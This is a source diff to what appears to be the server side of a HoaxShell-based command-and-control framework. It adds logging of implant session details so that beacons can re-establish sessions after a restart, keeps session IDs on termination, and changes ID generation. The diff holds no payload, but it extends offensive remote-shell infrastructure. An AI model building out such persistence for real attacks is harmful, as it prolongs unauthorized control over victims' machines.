@@ -12,7 +12,8 @@ from warnings import filterwarnings
 from datetime import date, datetime
 from ast import literal_eval
 from .common import *
-from .settings import * 
+from .settings import *
+from .logging import * 
 
 filterwarnings("ignore", category = DeprecationWarning)
 
@@ -82,9 +83,9 @@ class Payload_Generator:
 	def compute_hoaxshell(self, payload, user_args):
 
 		# Create session unique id if type == HoaxShell
-		verify = str(uuid4())[0:6]
-		get_cmd = str(uuid4())[0:6]
-		post_res = str(uuid4())[0:6]
+		verify = uuid4().hex[0:6]
+		get_cmd = uuid4().hex[0:6]
+		post_res = uuid4().hex[0:6]
 		header_id = 'Authorization' if not Hoaxshell_Settings._header else Hoaxshell_Settings._header
 		session_unique_id = '-'.join([verify, get_cmd, post_res])
 		exec_outfile = True if payload.meta['type'] in self.exec_outfile_support else False
@@ -99,6 +100,9 @@ class Payload_Generator:
 			'Shell' : payload.meta['shell'],
 			'iface' : payload.parameters['lhost']
 		}
+
+		# Store legit session metadata (used to restore previously established sessions)
+		HoaxShell_Implants_Logger.store_session_details(session_unique_id, Sessions_Manager.legit_session_ids[session_unique_id])
 
 		# Set lhost port
 		lhost = f"{payload.parameters['lhost']}:{Hoaxshell_Settings.bind_port}" if not Hoaxshell_Settings.ssl_support \
@@ -561,6 +565,19 @@ class Sessions_Manager:
 	sessions_graveyard = []
 	aliases = []
 
+	# Load past generated legit session payload details (if beacon is still alive they may be re-establish)
+	past_generated_sessions = HoaxShell_Implants_Logger.retrieve_past_sessions_data()
+
+	if past_generated_sessions:
+
+		sessions_data = literal_eval(past_generated_sessions)
+
+		for id in sessions_data.keys():
+			legit_session_ids[id] = sessions_data[id]
+
+		del sessions_data
+	del past_generated_sessions
+
 
 	def repair(self, session_id, key, new_val):
 
@@ -731,17 +748,17 @@ class Sessions_Manager:
 					Hoaxshell.post_res.remove(session_id_components[2])
 
 				self.active_sessions.pop(session_id, None)
-				self.legit_session_ids.pop(session_id, None)
+				#self.legit_session_ids.pop(session_id, None) 
 				del Hoaxshell.command_pool[session_id]
 
 				print(f'[{INFO}] Session terminated.')
 				Core_Server.announce_session_termination({'session_id' : session_id})
 
 			else:
-				print(f'[{ERR}] Permission denied (session owned by sibling).')
+				print(f'[{ERR}] Permission denied. This session is owned by a sibling server).')
 
 		else:
-			print('Session invalid.')
+			print('Session id not found in active sessions.')
 
 
 
@@ -1037,6 +1054,14 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 
 		if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):
+
+			# past_generated_sessions = literal_eval(HoaxShell_Implants_Logger.retrieve_past_sessions_data())
+
+			# if session_id not in Sessions_Manager.legit_session_ids.keys() and \
+			# session_id in past_generated_sessions.keys():
+			# 	Sessions_Manager.legit_session_ids[session_id] = past_generated_sessions[session_id]
+			# del past_generated_sessions
+
 			if session_id in Sessions_Manager.legit_session_ids.keys():
 				h = session_id.split('-')
 				Hoaxshell.verify.append(h[0])
